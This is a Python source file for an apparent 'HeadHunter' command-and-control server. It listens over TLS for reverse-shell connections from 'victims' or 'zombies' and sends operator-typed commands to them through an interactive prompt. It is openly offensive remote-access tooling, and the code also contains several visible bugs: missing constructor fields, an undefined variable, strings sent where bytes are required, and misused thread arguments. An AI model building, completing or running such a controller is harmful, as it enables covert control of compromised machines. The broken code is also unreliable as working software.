import socket
import ssl
import sys
import threading
import time

from dataclasses import dataclass


@dataclass(frozen=True)
class Victim:
    c: int
    addr: tuple[str, int]
    fd: int


class Server:
    def __init__(self, ip: str = '0.0.0.0', port: int = 443):
        self.victims: list[Victim] = []
        self.socket: socket = None
        self.port = port
        self.activefd: int = 0
        self.activeaddr: str = ""

        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        context.load_default_certs()

        with socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0) as sock:
            sock.bind((ip, port))
            sock.listen(5)
            with context.wrap_socket(sock, server_side=True) as self.ssock:
                self._listen()

    def _acceptor(self) -> None:
        # Continuously accept incoming zombie connections
        while True:
            c, addr = self.ssock.accept()
            self.ssock.do_handshake()

            c.send("BRUHGER\n")  # TODO Check if needs to removed

            victim = Victim(c=c, addr=addr)
            self.victims.append(
                victim
            )
            print("\nGot connection from " + str(victim.addr) + " starting session. Type any command or press enter to return to previous session\n")

    def _listen(self) -> None:
        # Initial master socket configuration, socket list allocation, and initial client connection handshake 
        print("Listening on port " + str(self.port) + " for connections...")
        
        try:
            c, addr = self.ssock.accept()
        except ssl.SSLError as e:
            print(f"Error giving victim a handshake :(\nError: {str(e)}")
            return None
        victim = Victim(c=c, addr=addr)

        print("Got connection from " + str(victim.addr) + ". Starting reverse shell session. Type \"exit\" to return to the HeadHunter interactive shell\n")
        self.victims.append(victim)

        acceptorThread = threading.Thread(target=self._acceptor, args=(self,), daemon=True)
        acceptorThread.start()

        self._control(c)

    def _control(self, fd: int) -> None:
        # Control session for selected victims

        try:
            while True:	
                d = input("Victim/> ")

                if d == "exit":
                    break
                d += "\n"

                fd.send(d.encode())
                data: str = fd.recv(15024)

                print(cmd)
                
        except Exception as e:
            print("Error: " + str(e))
